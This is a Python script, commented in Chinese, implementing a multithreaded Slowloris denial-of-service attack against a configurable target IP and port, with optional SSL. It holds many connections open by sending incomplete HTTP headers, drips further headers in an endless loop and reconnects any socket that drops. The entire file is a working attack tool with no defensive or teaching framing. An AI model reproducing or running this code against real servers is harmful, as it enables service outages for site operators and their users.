import logging
import random
import socket
import time
import ssl
import setup
import threading

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.INFO,
)


class Thread (threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name
        # 目标IP地址
        self.ip = ip
        # 并发访问数
        self.socket_count = socket_count
        self.len = len

    def run(self):
        # 获得锁
        thread_lock.acquire()
        while len(list_of_sockets) < socket_count:
            try:
                logging.debug("Creating socket nr %s")
                init_socket()
            except socket.error as e:
                logging.info(e)
                break
        # 释放锁
        thread_lock.release()


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    # 目标端口
    port = int(setup.port)
    # ssl协议
    is_ssl = setup.is_ssl
    if is_ssl == 'yes':
        s = ssl.wrap_socket(s)
    s.connect((ip, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(setup.user_agents)).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    list_of_sockets.append(s)
    print(len(list_of_sockets))
    return s


def main():
    logging.info("尝试使用 %s 个连接攻击服务器 %s ", socket_count, ip)
    logging.info("创建连接中...")
    # thread()
    # 使用多线程创建连接
    t_thread1 = Thread('t1')
    t_thread2 = Thread('t2')
    t_thread3 = Thread('t3')
    t_thread1.start()
    t_thread2.start()
    t_thread3.start()
    # 添加线程到线程列表
    threads.append(t_thread1)
    threads.append(t_thread2)
    threads.append(t_thread3)
    # 等待所有线程完成
    for t in threads:
        t.join()
    while True:
        try:
            logging.info(
                "发送请求头成功，当前数量: %s", len(list_of_sockets)
            )
            for s in list(list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s)
                    logging.info(
                        "部分连接与服务器断开，当前数量: %s", len(list_of_sockets)
                    )
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("重连中...")
                if len(list_of_sockets) >= socket_count:
                    break
                try:
                    s = init_socket()
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.info("Sleeping for %d seconds", sleep_time)
            time.sleep(sleep_time)
        except (KeyboardInterrupt, SystemExit):
            logging.info("停止Slowloris攻击")
            break
    print("Exiting Slowloris")


if __name__ == "__main__":
    list_of_sockets = []
    # 目标IP地址
    ip = setup.ip
    # 间隔时间
    sleep_time = int(setup.sleep_time)
    # 并发访问数
    socket_count = int(setup.socket_count)
    thread_lock = threading.Lock()
    threads = []
    main()
